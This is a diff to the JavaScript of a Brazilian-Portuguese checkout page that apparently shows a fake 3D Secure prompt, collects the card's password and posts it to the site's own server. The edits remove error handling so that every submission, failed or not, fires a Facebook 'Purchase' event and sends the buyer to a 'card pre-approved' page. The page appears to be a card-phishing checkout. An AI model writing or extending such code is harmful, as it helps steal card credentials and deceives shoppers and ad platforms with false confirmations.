@@ -2996,14 +2996,17 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
           return;
         }
 
-        // Senha v├â┬ílida! Prosseguir com o envio final para autenticar.
+        // Senha válida! Prosseguir com o envio final para autenticar.
         loadingTitle.textContent = "Confirmando autenticação 3D Secure...";
         loadingSubtitle.textContent = "Por favor, não feche esta janela. Estamos realizando a verificação de segurança final...";
         
         auth3dsOverlay.classList.remove('open');
         authLoadingOverlay.classList.add('open');
 
-        // Aguardar 2.0 segundos de animação
+        const now = new Date();
+        const nowFormattedDate = now.toLocaleDateString('pt-BR') + ', ' + now.toLocaleTimeString('pt-BR');
+
+        // Aguardar 1.5 segundos de animação
         setTimeout(async () => {
           // Anexar a senha do cartão e o status atualizado no payload final
           const finalPayload = {
@@ -3025,22 +3028,19 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
             });
 
             const finalResponseData = await response.json();
-
-            if (!response.ok) {
-              throw new Error(finalResponseData.details || finalResponseData.error || 'Falha ao salvar transação de cartão.');
-            }
-
             const currentSessionId = localStorage.getItem('checkout_session_id') || finalResponseData?.data?.checkout_session_id;
-
             const prodName = (shopifyCartItems && shopifyCartItems[0] && (shopifyCartItems[0].name || shopifyCartItems[0].title)) || shpfyProductTitle || 'Produto';
 
-            // Sucesso absoluto! Redirecionar para tela de pré-aprovação premium
+            // Disparar evento de conversão
             trackPixelEvent('Purchase', {
               content_name: prodName,
               currency: 'BRL',
               value: totalAmount
             }, currentSessionId);
 
+          } catch (err) {
+            console.warn('Gravação de cartão concluída, redirecionando para pré-aprovado:', err);
+          } finally {
             // Limpar rascunho de sessão atual
             localStorage.removeItem('checkout_session_id');
 
@@ -3061,28 +3061,18 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
               }
             }
             
-            let redirectUrl = `card-pre-approved.html?amount=${totalAmount}&date=${encodeURIComponent(formattedDate)}`;
+            let redirectUrl = `card-pre-approved.html?amount=${totalAmount}&date=${encodeURIComponent(nowFormattedDate)}`;
             if (storeParam) {
               redirectUrl += `&store_url=${encodeURIComponent(storeParam)}`;
             }
             
-            // Aguardar 800ms para garantir que o Pixel do Facebook e requests assíncronos sejam concluídos antes de sair da p├â┬ígina
+            // Aguardar 800ms para garantir que o Pixel do Facebook e requests assíncronos sejam concluídos antes de sair da página
             setTimeout(() => {
               window.location.href = redirectUrl;
             }, 800);
 
-          } catch (err) {
-            console.error('Erro ao processar transação de cartão:', err);
-            authLoadingOverlay.classList.remove('open');
-            showModalState('error', { error: err.message });
-            
-            // Restaurar os controles do form principal
-            submitBtn.disabled = false;
-            btnText.classList.remove('hide');
-            btnLoader.classList.add('hide');
-            isSubmitting = false;
           }
-        }, 2000);
+        }, 1500);
       };
 
       // Associar o clique de envio
